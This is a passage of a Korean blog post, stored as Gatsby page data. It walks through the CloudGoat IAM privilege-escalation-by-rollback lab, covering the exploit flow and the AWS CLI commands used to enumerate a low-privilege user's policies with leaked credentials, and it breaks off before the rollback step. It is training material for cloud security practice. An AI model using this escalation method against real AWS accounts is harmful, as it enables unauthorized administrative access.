{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/cloud-service-vuln-2/",
    "result": {"data":{"cur":{"id":"6bf12095-52bf-5758-8854-7cbacf9b813c","html":"<h1 id=\"클라우드-서비스-취약점-분석-2\" style=\"position:relative;\"><a href=\"#%ED%81%B4%EB%9D%BC%EC%9A%B0%EB%93%9C-%EC%84%9C%EB%B9%84%EC%8A%A4-%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D-2\" aria-label=\"클라우드 서비스 취약점 분석 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>클라우드 서비스 취약점 분석 2</h1>\n<h1 id=\"scenario-1--iam-privilege-escalation-by-rollback\" style=\"position:relative;\"><a href=\"#scenario-1--iam-privilege-escalation-by-rollback\" aria-label=\"scenario 1  iam privilege escalation by rollback permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[Scenario 1]:  IAM Privilege Escalation By Rollback</h1>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">Size: Small\nDifficulty: Easy\nCommand: $ ./cloudgoat.py create iam_privesc_by_rollback</code></pre></div>\n<h2 id=\"시나리오-개요\" style=\"position:relative;\"><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%EA%B0%9C%EC%9A%94\" aria-label=\"시나리오 개요 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>시나리오 개요</h2>\n<h3 id=\"자원\" style=\"position:relative;\"><a href=\"#%EC%9E%90%EC%9B%90\" aria-label=\"자원 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>자원</h3>\n<ul>\n<li>한 명의 IAM User (5 정책 버전)</li>\n</ul>\n<h3 id=\"취약점\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점</h3>\n<ul>\n<li>IAM User: Raynor</li>\n<li><code class=\"language-text\">SetDefaultPolicyVersion</code>을 통한 이전 버전으로 rollback 하는 기능을 이용하여 권한 상승이 가능합니다.</li>\n</ul>\n<h3 id=\"목표\" style=\"position:relative;\"><a href=\"#%EB%AA%A9%ED%91%9C\" aria-label=\"목표 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>목표</h3>\n<ul>\n<li>공격자는 highly-limited IAM 사용자 부터 시작해서 이전 IAM 정책 버전을 검토하고 전체 관리자 권한을 허용하는 버전을 복원해서 권한 상승 취약점을 이용할 수 있습니다.</li>\n<li>IAM 사용자 <code class=\"language-text\">Raynor</code> security credentials</li>\n</ul>\n<h3 id=\"시나리오-환경-설정\" style=\"position:relative;\"><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%99%98%EA%B2%BD-%EC%84%A4%EC%A0%95\" aria-label=\"시나리오 환경 설정 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>시나리오 환경 설정</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 37.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABW0lEQVQoz3WRW2+CQBSEERW0yEVuCiwXISqiSLVqg03VNH1u+t70T/T/J9PsMRpt0ofJkJPl25k9Qke1ISvWVdLNt6zYEET9fzU08kbTgNjqkws+m8Edjkl9KyFnYQHLSaEbERTVx4PqoacF6Gk+VD2gmaoz6P2Q5hcYd2G9OaGsXkj5fIe82OHx6YBpsUU2WWHgjQneVQaQOjakrgOp40DuuqS2bN8DeSLbzeAMzuIAw4opAf+BV6KDvN5fCSr5BUiVeZp5WWOxrDGdbcnXmyPKao9JvoHtpjDtBLoZ0SU9PYBmMGhGCMOM6Tku6ejiJKsQxnOwqEDAcvgsRxiXiJIK2XiFJF0iGpUEaUkWVbyIPwGf3QHjUQkWzQjoxYtzIseH63swTEap+BKabfO60Ws90bjbMAHr/RF1fcD29R3D0yeed2/4+Erx/aMiX2QQWw4l4cDbJLe6TfgLejXGYTnmHOMAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./0.png\"\n        title=\"./0.png\"\n        src=\"/static/30ddf6e63a3311a4fd4e4c117945ae5d/37523/0.png\"\n        srcset=\"/static/30ddf6e63a3311a4fd4e4c117945ae5d/e9ff0/0.png 180w,\n/static/30ddf6e63a3311a4fd4e4c117945ae5d/f21e7/0.png 360w,\n/static/30ddf6e63a3311a4fd4e4c117945ae5d/37523/0.png 720w,\n/static/30ddf6e63a3311a4fd4e4c117945ae5d/302a4/0.png 1080w,\n/static/30ddf6e63a3311a4fd4e4c117945ae5d/46115/0.png 1290w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"exploit-흐름도\" style=\"position:relative;\"><a href=\"#exploit-%ED%9D%90%EB%A6%84%EB%8F%84\" aria-label=\"exploit 흐름도 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploit 흐름도</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAADDElEQVQoz22SS0xTQRSGDxTovbcXeWPpzL2FthYsUB6l0gIWkUeFermU8jBIQdSoiYlGExODITFQg2AEQQE1sEDR+FgBghJeGxJrjDFESIyJK13owrBQQxXpmCsBNi7+nMnMme/8M+eARqNjDclpBwwGYwYhBMxW+7ncfGH0YIX7oUOsfyQ4Gx47xIanQuWRp1Isr2yS1o9zbOXj5hxHnXQnQaNjMMY0xjgEOI6nk5KSExKTUjAAgNliv5qbX74sVjZ6BWfja1d1k1c46JoVxeo5QXDNOStq50Sxeibbss+bnpLaeOraJ9Dq01ikipOAckAIUQwTHBQexgZjTk0vzBLo65sEqfJnQgBgRl7s8Zvtnj+mYo/fVNi6ZrJ71kzuu8RUeZ1kJ5e2RUQChHDx+g0gxpjiOI7eUDytjlMztlQdY81zsgAQmH9+ObPmum/e3eObcPf4pmq7fFOHunyT9TdWnzs7VifNJ15qpLwEQw6zBcQY0QhxtDIygMq0RNEAMTRnjKZ1mhiKBgiOtl4OV9jux6rESYQqXqDQvYPRMfYnO1XZZ3coAIJ5bSqNkGrboW5PmUJ64v7eL0UFQ+Rd2zzxlg2T9/n9349L+7Xda6+ODayTpv71n03966sNt9Z/uG/5SUXn73Hp3w1ZdoZTa7eBBmsVO0YIlLZ+ddd2r5CR+W/k+MAKKb2y0rlACAjtv0YP9/o/1N/0v63r8S/W9fjf1HT7P9rbfEMAELArrZDheM020JhiZqSD02dmsvqa+4YHWzx3bl/qetB8YUqQHGLLxWjIGs5gi8Zs4aXP9wda7mUFWkcyY9OPhnERIEe8lkYIbXdZFaekNFoDDQBBEmBTACAboEAGKd16tnjCy7umlzjX9GJ81cwSVfBsDvQtKrsCgpRq4+YcbjYF0xJUq89gLLkOtrCghM2zOdjE5FwGxTKUcreDDcns4AOMHWowtqsD0jrj5aZ2TqW3KXBcFIUwT28BEUJyyeX/hKWIeYpXhspFANkxAFkDgOwkQGAJgIz7B+M28pA0KSjkL/EzBdFI93hyAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"27.png\"\n        title=\"27.png\"\n        src=\"/static/52e6d27f45fc842ac420ddf38f505b82/37523/27.png\"\n        srcset=\"/static/52e6d27f45fc842ac420ddf38f505b82/e9ff0/27.png 180w,\n/static/52e6d27f45fc842ac420ddf38f505b82/f21e7/27.png 360w,\n/static/52e6d27f45fc842ac420ddf38f505b82/37523/27.png 720w,\n/static/52e6d27f45fc842ac420ddf38f505b82/302a4/27.png 1080w,\n/static/52e6d27f45fc842ac420ddf38f505b82/07a9c/27.png 1440w,\n/static/52e6d27f45fc842ac420ddf38f505b82/4435f/27.png 2479w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"exploit-시나리오-흐름도\" style=\"position:relative;\"><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%9D%90%EB%A6%84%EB%8F%84\" aria-label=\"exploit 시나리오 흐름도 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>exploit 시나리오 흐름도</h3>\n<ul>\n<li>IAM 사용자 “Raynor” 로 시작해서 공격자는 사용할 수 있는 권한이 몇 개 밖에 없습니다.</li>\n<li>공격자는 Raynor의 권한을 분석하고 SetDefaultPolicyVersion 권한을 확인합니다.</li>\n<li>이전의 버전을 기본값으로 설정하여 정책의 다른 4개 버전에 대한 액세스를 허용합니다.</li>\n<li>이전 정책 버전을 검토한 후 공격자는 특정 버전이 전체 관리자 권한 을 제공한는 것을 발견</li>\n<li>공격자는 전체 관리자 정책 버전을 복원하여 전체 관리자 권한과 원하는 악의적인 작업을 수행할 수 있는 능력을 얻습니다.</li>\n<li>마지막 단계로 공격자는 Raynor의 정책 버전을 원래 버전으로 되돌리도록 선택할 수 있습니다.</li>\n</ul>\n<h2 id=\"exploit-시나리오\" style=\"position:relative;\"><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4\" aria-label=\"exploit 시나리오 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploit 시나리오</h2>\n<h3 id=\"iam-user-raynor-사용-가능한-권한-열거\" style=\"position:relative;\"><a href=\"#iam-user-raynor-%EC%82%AC%EC%9A%A9-%EA%B0%80%EB%8A%A5%ED%95%9C-%EA%B6%8C%ED%95%9C-%EC%97%B4%EA%B1%B0\" aria-label=\"iam user raynor 사용 가능한 권한 열거 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>IAM User: Raynor 사용 가능한 권한 열거</h3>\n<ul>\n<li>클라우드 환경을 분석하던중 <code class=\"language-text\">raynor</code> 사용자의 AWS IAM config 파일을 확인할 수 있었습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 31.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABXUlEQVQY023P23KaYBiF4V9NZ5pJSLQ2QYNEQESRPchWQBJNxwvoNPd/JW9HmsMePAfrYM33LaGvAhTV5mWxxbRirnllRVjbPUvdw3YyVCNEtXK+SwpCSAxGY4Y3k/8S603SFzXDJ4wbXL/q+WHNxs6IkhY7aNmGHc8zk/uHBbd3M8TgATF4/Ed8GY4Rad5SlB1p1lK3H7wfT9iX39j1L7qmoyhb6uaNY3emPZ4oioZ9WhFGKVFUkuQ+l88Jlz9PyIqMcLy8/8ILKtygYmPHGGufV32HvUtwvQzdcJjNV8gznecv8txgrpgo6hp1ueJVM3mcKAgvOJCXH/hRTZQcMa0Ebemg6z6Kuutn226B410PHpgrW378NHiSTe6kF4Y3U4YjuTf6NkVkRcehPpOkDWneURUdRnVhk59I4pJ91hLva4ryjbJ6pzqcqOoz156muyy0JX51j19KSOMpfwHjVq6An0EyNwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./1.png\"\n        title=\"./1.png\"\n        src=\"/static/0611d0f31dc52d59d423dd14d5d437d5/37523/1.png\"\n        srcset=\"/static/0611d0f31dc52d59d423dd14d5d437d5/e9ff0/1.png 180w,\n/static/0611d0f31dc52d59d423dd14d5d437d5/f21e7/1.png 360w,\n/static/0611d0f31dc52d59d423dd14d5d437d5/37523/1.png 720w,\n/static/0611d0f31dc52d59d423dd14d5d437d5/681f1/1.png 899w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>해당 사용자의 <code class=\"language-text\">access_key_id</code>, <code class=\"language-text\">secret_key</code> AWS Credentials를 확인한 결과 유출된 값으로 AWS config Profile을 설정하여 해당 권한을 획득하기로 하였습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 20.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA7UlEQVQY01XKy1KCYACAUUbSmcjiqmEJaDqCGHJL8QfSvE1uWvb+j/I10srF2R1pmZRcLaICf57zHhVk9YVEnCmrE9NZytAJcLyQVyfA9UJUbYjSfab7OEDpDjBtjb7zhGoaSFV9RJQH6s8z1ZX4Iv7+Zb77IU83RHHBar2lqk+I6sBG7AnmGX6QEoQpMz9jvbcQlwdmSwtpVRxZJjVpviOKK+Jsy0e+JQxXhJFgPEmwX3xGkxh3FDF0FxjWGKs/QTM8rP4b94qLJGn/evYU3fSaZFgjzN64iXLHRG4bDaml3mjd6TfkzpWG3Nb5A65McAfOu6LUAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./2.png\"\n        title=\"./2.png\"\n        src=\"/static/10c08c750c23bc681293357cc96fcc8f/37523/2.png\"\n        srcset=\"/static/10c08c750c23bc681293357cc96fcc8f/e9ff0/2.png 180w,\n/static/10c08c750c23bc681293357cc96fcc8f/f21e7/2.png 360w,\n/static/10c08c750c23bc681293357cc96fcc8f/37523/2.png 720w,\n/static/10c08c750c23bc681293357cc96fcc8f/71c8e/2.png 875w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>해당 자격 증명 정보들을 구성하여 하나의 <code class=\"language-text\">Fake AWS Credentials</code> 를 구축하였습니다.</li>\n<li>IAM 보안 정책 그룹을 확인하기 전에 Security Credentials 을 갖고 있는 계정 정보와 IAM 사용자 액세스를 확인하였습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">aws sts get-caller-identity</code></pre></div>\n<ul>\n<li>다음 명령은 ARN을 포함하여 총 3 가지 정보를 출력합니다.</li>\n<li>AWS IAM Format를 확인한 결과 해당 Arn 정보를 통해서 Access Account ID , IAM Username 정보를 확인할 수 있었습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 28.333333333333332%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABLElEQVQY02XQ22rCUBCF4a3QGhOzkzQeUuOBGk12jppEa6EIUkqvSkvf/2H+thFE8eJjhllzMyPWmz2R2pBmW9K0Ilq/YG4/WCwzsnxHqNbESUUYFazCotmN4hMVV6gk5/hlcfyWPEV9RKhqorhmGZaU9YGiOhAUrwSrDd44pD98wrR8NH3Y6P4zRhcG9BwT6dpohoPwpwmTWcKjr1DpHpXsWAYF3jjCtCYNQ/r0pI/lzDDMMaY9QdrThuXMkXKBEA8IYSPyYsciSFFJRRQWLOIao3wnWOWouGyyOK2as1VSNrV5T1aT5c9kRcnbj8vhUzJfuQi9512doxkebd3jXuujdYfcddxz3ukOzv3JCE0fYFgWPdumozsI0ZKItnWl1b6c2Tf5DeGc/O3+AgvJnEh5Lm3fAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./3.png\"\n        title=\"./3.png\"\n        src=\"/static/e2bc2d95989beddca5255cb4048493a3/37523/3.png\"\n        srcset=\"/static/e2bc2d95989beddca5255cb4048493a3/e9ff0/3.png 180w,\n/static/e2bc2d95989beddca5255cb4048493a3/f21e7/3.png 360w,\n/static/e2bc2d95989beddca5255cb4048493a3/37523/3.png 720w,\n/static/e2bc2d95989beddca5255cb4048493a3/d9217/3.png 904w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token string\">\"Arn\"</span><span class=\"token builtin class-name\">:</span> \n\t<span class=\"token string\">\"arn:aws:iam::712987748923:user\n\traynor-iam_privesc_by_rollback_cgidesxwoc66a4\"</span></code></pre></div>\n<ul>\n<li>IAM Credentials 에 대한 보안적 요소들을 평가할 때 정책 및 권한에 대해 리스트하여 나열하는 것은 필수적인 단게입니다.</li>\n<li>username은 생각보다 긴 <code class=\"language-text\">raynor-iam_privesc_by_rollback_cgidesxwoc66a4</code> format을 이루고 있었습니다.</li>\n<li>다음 명령을 사용하여 IAM 사용자 <code class=\"language-text\">Raynor</code> 의 Inline Policy, management policy를 각각 열거해보겠습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">aws iam list-user-policies --user-name raynor-iam_privesc_by_rollback_cgidesxwoc66a4 --profi\nle bob1\n\n-<span class=\"token operator\">></span> list-user-policies 명령은 해당 유저 네임에 대한 IAM 사용자에게 연결된 정책들을 나열합니다.\n\naws iam list-attached-user-policies --user-name raynor-iam_privesc_by_rollback_cgidesxwoc66a\n<span class=\"token number\">4</span> --profile bob1\n\n-<span class=\"token operator\">></span> 관리형 정책들 을 나열합니다.</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 24.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAABBElEQVQY012P6U7CUBBGL4Ispbe0FOi+uhUMAqUWUSTxAUh8ABPf/ymO6TUR4o+T882XySQjnlY76t2RbXWgrA7s6wPp+4mk+qBc1zzMN6w3L2yrN9blXrmh3L5SPR+p9ztOXz6f3zHpXYyYOjlJtiTNl4wnGUPp0dc9uprDQHO47k3oazPFYOhc4Co03cWwXKTp0BtMEaI1QjcCZu4t2c0KLyiQRoA1TjDHMaZygmWnGGZ47uxz1+7Yik7XRhhmhD3LCeMFxaLGnmaKIJrj+vfKzQdR8ogfzRXNbtP7YYEXFljqeIIchYi+5qjQvNZqmwghES0DIfTfrKxfzPJfloir0R8/Gr+BUVwzdE0AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./4.png\"\n        title=\"./4.png\"\n        src=\"/static/9f3e2d5bc88f996fbcffba9b2a292381/37523/4.png\"\n        srcset=\"/static/9f3e2d5bc88f996fbcffba9b2a292381/e9ff0/4.png 180w,\n/static/9f3e2d5bc88f996fbcffba9b2a292381/f21e7/4.png 360w,\n/static/9f3e2d5bc88f996fbcffba9b2a292381/37523/4.png 720w,\n/static/9f3e2d5bc88f996fbcffba9b2a292381/636c2/4.png 911w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>Customer managed policies 에 연결되어 고객 관리형 정책은 사용자가 생성하고 AWS 계정의 여러 사용자, 그룹 또는 역활에 연결할 수 있는 독립형 자격 증명 기반 정책으로 이루워집니다.</li>\n<li><code class=\"language-text\">cg-raynor-policy</code> 는 IAM 사용자 “cg-raynor-policy-iam_privesc_by_rollback_cgidesxwoc66a4” 에 직접 연결됩니다.</li>\n</ul>\n<h3 id=\"raynor-이전-버전의-iam-policies\" style=\"position:relative;\"><a href=\"#raynor-%EC%9D%B4%EC%A0%84-%EB%B2%84%EC%A0%84%EC%9D%98-iam-policies\" aria-label=\"raynor 이전 버전의 iam 